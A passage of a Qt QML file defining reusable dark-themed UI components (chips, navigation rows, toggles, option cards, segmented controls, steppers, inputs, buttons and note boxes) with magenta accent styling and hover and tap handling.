        spacing: 8

        Label {
            text: parent.label
            color: "#4b4b53"
            font.family: "JetBrains Mono"
            font.pixelSize: 9
            font.capitalization: Font.AllUppercase
            font.letterSpacing: 1
        }
        Label {
            Layout.fillWidth: true
            Layout.minimumWidth: 0
            text: parent.value
            color: parent.tone
            font.family: "JetBrains Mono"
            font.pixelSize: 9
            horizontalAlignment: Text.AlignRight
            elide: Text.ElideRight
        }
    }

    component Chip : Rectangle {
        id: chip
        property string label: ""
        property bool on: true
        property color accent: "#d946ef"

        implicitWidth: chipLabel.implicitWidth + 22
        implicitHeight: 24
        radius: 6
        color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.13) : "#101010"
        border.width: 1
        border.color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.42) : "#191919"

        Label {
            id: chipLabel
            anchors.centerIn: parent
            text: chip.label
            color: chip.on ? "#e879f9" : "#4b4b53"
            font.family: "JetBrains Mono"
            font.pixelSize: 10
        }
    }

    component NavRow : Rectangle {
        id: nav
        property string code: ""
        property string title: ""
        property bool active: false
        signal picked()

        Layout.fillWidth: true
        implicitHeight: 38
        radius: 8
        color: active ? Qt.rgba(0.851, 0.275, 0.937, 0.11) : (hov.hovered ? "#111111" : "transparent")

        Rectangle {
            anchors.left: parent.left
            anchors.verticalCenter: parent.verticalCenter
            width: 3
            height: 18
            radius: 2
            color: "#d946ef"
            opacity: nav.active ? 1 : 0
            Behavior on opacity { NumberAnimation { duration: 140 } }
        }

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 14
            anchors.rightMargin: 12
            spacing: 10

            Label {
                text: nav.code
                color: nav.active ? "#d946ef" : "#3f3f46"
                font.family: "JetBrains Mono"
                font.pixelSize: 10
                font.bold: nav.active
            }
            Label {
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                Layout.preferredWidth: 0
                text: nav.title
                color: nav.active ? "#e879f9" : hov.hovered ? "#d1d5db" : "#8b8b93"
                font.family: "JetBrains Mono"
                font.pixelSize: 11
                font.bold: nav.active
                elide: Text.ElideRight
            }
        }

        HoverHandler {
            id: hov
            cursorShape: Qt.PointingHandCursor
        }
        TapHandler { onTapped: nav.picked() }
    }

    component ToggleRow : Rectangle {
        id: row
        property string title: ""
        property string sub: ""
        property bool on: false
        signal toggled(bool state)

        Layout.fillWidth: true
        implicitHeight: 50
        radius: 8
        color: hov.hovered ? "#111111" : "transparent"
        border.width: 1
        border.color: hov.hovered ? "#1a1a1a" : "transparent"

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 10
            anchors.rightMargin: 12
            spacing: 12

            Rectangle {
                Layout.alignment: Qt.AlignVCenter
                implicitWidth: 38
                implicitHeight: 20
                radius: 10
                color: row.on ? "#d946ef" : "#141414"
                border.width: row.on ? 0 : 1
                border.color: "#2a2a2a"
                Behavior on color { ColorAnimation { duration: 130 } }

                Rectangle {
                    width: 14
                    height: 14
                    radius: 7
                    y: 3
                    x: row.on ? parent.width - width - 3 : 3
                    color: row.on ? "#050505" : "#6b7280"
                    Behavior on x { NumberAnimation { duration: 130; easing.type: Easing.OutCubic } }
                    Behavior on color { ColorAnimation { duration: 130 } }
                }
            }

            ColumnLayout {
                Layout.fillWidth: true
                spacing: 1

                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: row.title
                    color: row.on ? "#d1d5db" : "#71717a"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 12
                    elide: Text.ElideRight
                }
                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    visible: row.sub !== ""
                    text: row.sub
                    color: "#4b4b53"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideRight
                }
            }
        }

        HoverHandler { id: hov; cursorShape: Qt.PointingHandCursor }
        TapHandler { onTapped: row.toggled(!row.on) }
    }

    component OptionCard : Rectangle {
        id: opt
        property string label: ""
        property string sub: ""
        property bool selected: false
        signal picked()

        Layout.fillWidth: true
        implicitHeight: 50
        radius: 8
        color: selected ? Qt.rgba(0.851, 0.275, 0.937, 0.10) : (hov.hovered ? "#111111" : "transparent")
        border.width: 1
        border.color: selected ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 12
            anchors.rightMargin: 12
            spacing: 10

            Rectangle {
                id: radio
                Layout.alignment: Qt.AlignVCenter
                implicitWidth: 14
                implicitHeight: 14
                radius: 7
                color: "transparent"
                border.width: 1
                border.color: opt.selected ? "#d946ef" : "#2a2a2a"

                Rectangle {
                    anchors.centerIn: parent
                    width: 6
                    height: 6
                    radius: 3
                    color: "#d946ef"
                    visible: opt.selected
                }
            }

            ColumnLayout {
                Layout.fillWidth: true
                spacing: 1

                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: opt.label
                    color: opt.selected ? "#e879f9" : "#d1d5db"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 12
                    font.bold: opt.selected
                    elide: Text.ElideRight
                }
                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: opt.sub
                    color: "#4b4b53"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideRight
                }
            }
        }

        HoverHandler { id: hov; cursorShape: Qt.PointingHandCursor }
        TapHandler { onTapped: opt.picked() }
    }

    component Segmented : Rectangle {
        id: seg
        property var options: []
        property int current: 0
        signal picked(int index)

        Layout.minimumWidth: 0
        implicitHeight: 36
        implicitWidth: segRow.implicitWidth + 8
        radius: 8
        color: "#0a0a0a"
        border.width: 1
        border.color: "#1a1a1a"

        RowLayout {
            id: segRow
            anchors.fill: parent
            anchors.margins: 3
            spacing: 3

            Repeater {
                model: seg.options

                delegate: Rectangle {
                    Layout.fillHeight: true
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    implicitWidth: segLabel.implicitWidth + 26
                    radius: 6
                    color: index === seg.current ? Qt.rgba(0.851, 0.275, 0.937, 0.18) : (hov2.hovered ? "#141414" : "transparent")
                    border.width: index === seg.current ? 1 : 0
                    border.color: Qt.rgba(0.851, 0.275, 0.937, 0.5)

                    Label {
                        id: segLabel
                        anchors.left: parent.left
                        anchors.right: parent.right
                        anchors.verticalCenter: parent.verticalCenter
                        anchors.leftMargin: 8
                        anchors.rightMargin: 8
                        text: modelData
                        color: index === seg.current ? "#e879f9" : "#6b7280"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 11
                        font.bold: index === seg.current
                        horizontalAlignment: Text.AlignHCenter
                        elide: Text.ElideRight
                    }

                    HoverHandler { id: hov2; cursorShape: Qt.PointingHandCursor }
                    TapHandler { onTapped: seg.picked(index) }
                }
            }
        }
    }

    component StepBtn : Rectangle {
        id: stepBtn
        property string glyph: ""
        property bool enabledStep: true
        signal hit()

        Layout.fillHeight: true
        implicitWidth: 30
        radius: 6
        color: sbHover.hovered && stepBtn.enabledStep ? "#1a1a1a" : "transparent"

        Label {
            anchors.centerIn: parent
            text: stepBtn.glyph
            color: stepBtn.enabledStep ? "#d1d5db" : "#3f3f46"
            font.family: "JetBrains Mono"
            font.pixelSize: 14
            font.bold: true
        }

        HoverHandler { id: sbHover; cursorShape: Qt.PointingHandCursor }
        TapHandler { enabled: stepBtn.enabledStep; onTapped: stepBtn.hit() }
    }

    component Stepper : Rectangle {
        id: step
        property int value: 0
        property int from: 0
        property int to: 100
        property string suffix: ""
        signal stepped(int v)

        implicitWidth: 150
        implicitHeight: 34
        radius: 8
        color: "#0a0a0a"
        border.width: 1
        border.color: "#1a1a1a"

        RowLayout {
            anchors.fill: parent
            anchors.margins: 3
            spacing: 3

            StepBtn {
                glyph: "−"
                enabledStep: step.value > step.from
                onHit: { step.value -= 1; step.stepped(step.value) }
            }

            Label {
                Layout.fillWidth: true
                text: step.value + step.suffix
                color: "#d1d5db"
                font.family: "JetBrains Mono"
                font.pixelSize: 12
                font.bold: true
                horizontalAlignment: Text.AlignHCenter
            }

            StepBtn {
                glyph: "+"
                enabledStep: step.value < step.to
                onHit: { step.value += 1; step.stepped(step.value) }
            }
        }
    }

    component FieldLabel : Label {
        color: "#4b4b53"
        font.family: "JetBrains Mono"
        font.pixelSize: 9
        font.letterSpacing: 1.4
        font.capitalization: Font.AllUppercase
    }

    component InputBox : TextField {
        id: input
        property string value: ""
        property alias placeholder: input.placeholderText
        signal edited(string text)

        implicitHeight: 34
        text: value
        leftPadding: 10
        rightPadding: 10
        color: "#d1d5db"
        placeholderTextColor: "#3f3f46"
        selectionColor: Qt.rgba(0.851, 0.275, 0.937, 0.35)
        selectedTextColor: "#e879f9"
        font.family: "JetBrains Mono"
        font.pixelSize: 11
        onTextChanged: input.edited(text)
        background: Rectangle {
            color: "#0a0a0a"
            radius: 8
            border.width: 1
            border.color: input.activeFocus ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"
            Behavior on border.color { ColorAnimation { duration: 120 } }
        }
    }

    component InputArea : TextArea {
        id: area
        property string value: ""
        signal edited(string text)

        text: value
        leftPadding: 10
        rightPadding: 10
        topPadding: 8
        bottomPadding: 8
        color: "#d1d5db"
        selectionColor: Qt.rgba(0.851, 0.275, 0.937, 0.35)
        selectedTextColor: "#e879f9"
        font.family: "JetBrains Mono"
        font.pixelSize: 11
        wrapMode: TextArea.Wrap
        onTextChanged: area.edited(text)
        background: Rectangle {
            color: "#0a0a0a"
            radius: 8
            border.width: 1
            border.color: area.activeFocus ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"
            Behavior on border.color { ColorAnimation { duration: 120 } }
        }
    }

    component ActionButton : Rectangle {
        id: btn
        property string label: ""
        property color fill: "#d946ef"
        property color fg: "#050505"
        signal clicked()

        implicitWidth: btnLabel.implicitWidth + 44
        implicitHeight: 34
        radius: 8
        color: btn.enabled ? (bh.hovered ? Qt.lighter(btn.fill, 1.12) : btn.fill) : "#141414"
        opacity: btn.enabled ? 1 : 0.6
        Behavior on color { ColorAnimation { duration: 120 } }

        Label {
            id: btnLabel
            anchors.centerIn: parent
            text: btn.label
            color: btn.fg
            font.family: "JetBrains Mono"
            font.pixelSize: 11
            font.bold: true
            font.letterSpacing: 1
            font.capitalization: Font.AllUppercase
        }

        HoverHandler { id: bh; cursorShape: Qt.PointingHandCursor }
        TapHandler { enabled: btn.enabled; onTapped: btn.clicked() }
    }

    component Note : Rectangle {
        property string text: ""
        property color tone: "#e879f9"

        Layout.fillWidth: true
        implicitHeight: Math.max(40, noteText.implicitHeight + 24)
        radius: 8
        color: Qt.rgba(tone.r, tone.g, tone.b, 0.06)
        border.width: 1
        border.color: Qt.rgba(tone.r, tone.g, tone.b, 0.22)

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 12
            anchors.rightMargin: 12
            spacing: 10

            Rectangle {
                Layout.alignment: Qt.AlignTop
                Layout.topMargin: 6
                implicitWidth: 3
                implicitHeight: 14
                radius: 2
                color: parent.parent.tone
            }
            Label {
                id: noteText
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                Layout.preferredWidth: 0
                Layout.topMargin: 12
                Layout.bottomMargin: 12
                text: parent.parent.text
                color: "#9ca3af"
                font.family: "JetBrains Mono"
                font.pixelSize: 10
                wrapMode: Text.Wrap
                lineHeight: 1.35
            }
        }
    }
}
